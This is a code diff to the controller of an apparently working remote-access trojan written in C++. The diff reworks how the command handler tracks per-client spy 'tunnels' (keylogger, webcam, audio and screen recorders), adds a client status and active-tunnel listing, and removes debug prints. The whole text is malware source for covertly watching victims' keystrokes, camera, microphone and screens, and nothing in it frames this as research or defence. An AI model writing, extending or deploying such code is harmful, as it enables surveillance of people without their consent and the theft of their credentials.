@@ -69,7 +69,7 @@ CommandHandler::CommandHandler(
     std::string* __p_ip,
     uint __port,
     int* __p_user_verbosity,
-    std::vector<Tunnel>* __p_tunnels,
+    std::vector<Tunnel*>* __p_tunnels,
     std::shared_ptr<TunnelContext> __tunnel_context
     ): p_ip_(__p_ip),port_(__port), p_clients_(__p_clients), p_event_log_(__p_event_log), p_shutdown_flag_(__p_shutdown_flag), p_user_verbosity_(__p_user_verbosity), p_tunnels_(__p_tunnels), tunnel_context_(__tunnel_context) {
     
@@ -316,6 +316,26 @@ void CommandHandler::list() {
     for (int i=0; i<p_clients_->size(); i++) {
         if (p_clients_->at(i) != nullptr) {
             *p_event_log_ << "\n==Client " << i << "==    " << p_clients_->at(i)->ip();
+            *p_event_log_ << "\nStatus: ";
+            if (ClientHandler::is_client_up(p_clients_->at(i)->socket()) == 0) {
+                *p_event_log_ << GREEN << "UP\033[0m";
+            } else {
+                *p_event_log_ << RED << "DOWN\033[0m";
+            }
+            *p_event_log_ << "\nTunnels:";
+            for (auto it=p_tunnels_->begin(); it != p_tunnels_->end(); it++) {
+                if ((*it)->client_index_ == i) {
+                    if ((*it)->command_code_ == KEYLOGGER) {
+                        *p_event_log_ << "\n__keylogger__:";
+                    } else if ((*it)->command_code_ == WEBCAM_RECORDER) {
+                        *p_event_log_ << "\n__webcam_recorder__:";
+                    } else if ((*it)->command_code_ == AUDIO_RECORDER) {
+                        *p_event_log_ << "\n__audio_recorder__:";
+                    } else if ((*it)->command_code_ == SCREEN_RECORDER) {
+                        *p_event_log_ << "\nscreen__recorder__:";
+                    }
+                }
+            }
         }
     }
     *p_event_log_ << RESET_C2_FIFO;
@@ -353,19 +373,6 @@ void CommandHandler::kill() {
 void CommandHandler::keylogger() {
     int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
 
-    if (client_index == 5) {
-        std::cout << MAGENTA << "\n==========\n[CommandHandler::keylogger] Keylogger command received: VECTOR: " << p_tunnels_->size() << RESET << std::endl;
-        for (auto it = p_tunnels_->begin(); it != p_tunnels_->end(); it++) {
-            std::cout << MAGENTA << "[CommandHandler::keylogger] Tunnel command code: " << static_cast<int>(it->command_code_) << RESET;
-            std::cout << MAGENTA << "[CommandHandler::keylogger] Tunnel client index: " << it->client_index_ << RESET;
-            std::cout << MAGENTA << "[CommandHandler::keylogger] Tunnel address: " << get_tunnel(it->client_index_, it->command_code_) << std::endl;
-            std::cout << "-------------------------" << RESET;
-        }
-        std::cout << MAGENTA << "\n==========\n" << RESET;
-        return;
-    } 
-    
-
     if (p_clients_->at(client_index) == nullptr || ClientHandler::is_client_up(p_clients_->at(client_index)->socket()) < 0) {
         *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Client " << client_index << " is not available" << RESET_C2_FIFO;
         return;
@@ -384,10 +391,10 @@ void CommandHandler::keylogger() {
     } else {
         if (p_tunnel == nullptr) {
             Keylogger* keylogger = new Keylogger();
-            p_tunnels_->emplace_back(KEYLOGGER, client_index, keylogger);
+            Tunnel* tunnel = new Tunnel(client_index, KEYLOGGER, keylogger);
+            p_tunnels_->emplace_back(tunnel);
             try {
-                //p_tunnels_->back().thread_ = std::thread(&CommandHandler::handle_tunnelt, this, &p_tunnels_->back());
-                std::thread(&CommandHandler::handle_tunnelt, this, &p_tunnels_->back()).detach();
+                std::thread(&CommandHandler::handle_tunnelt, this, tunnel).detach();
             } catch (const std::system_error& e) {
                 *p_event_log_ << LOG_MUST << RED << "[CommandHandler::keylogger] Error creating thread for keylogger" << RESET_C2_FIFO;
                 erase_tunnel(p_tunnels_, client_index, KEYLOGGER);
@@ -397,19 +404,14 @@ void CommandHandler::keylogger() {
 }
 
 void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel) {
-    int client_index = __p_tunnel->client_index_;
-    CommandCode command_code = __p_tunnel->command_code_;
-
     if (__p_tunnel->p_spy_tunnel_->init(*p_ip_, port_, __p_tunnel->p_tunnel_shutdown_fd_, TCP_BASED) == 0) {
         __p_tunnel->p_spy_tunnel_->run();
     }
 
-    std::cout << MAGENTA << "[CommandHandler::handle_tunnelt] Tunnel thread finished" << RESET;
-
     // If we reach here, the tunnel has finished (due to error or completion) and ready to be cleaned up
     {
         std::lock_guard<std::mutex> lock(tunnel_context_->tunnel_mutex_);
-        tunnel_context_->tunnel_queue_.push(get_tunnel(client_index, command_code));
+        tunnel_context_->tunnel_queue_.push(__p_tunnel);
         tunnel_context_->tunnel_cv_.notify_one();
         return;
     }
@@ -417,8 +419,8 @@ void CommandHandler::handle_tunnelt(Tunnel* __p_tunnel) {
 
 Tunnel* CommandHandler::get_tunnel(int __client_index, CommandCode __command_code) {
     for (auto it=p_tunnels_->begin(); it != p_tunnels_->end(); it++) {
-        if (it->client_index_ == __client_index && it->command_code_ == __command_code) {
-            return &(*it);
+        if ((*it)->client_index_ == __client_index && (*it)->command_code_ == __command_code) {
+            return *it;
         }
     }
     return nullptr;
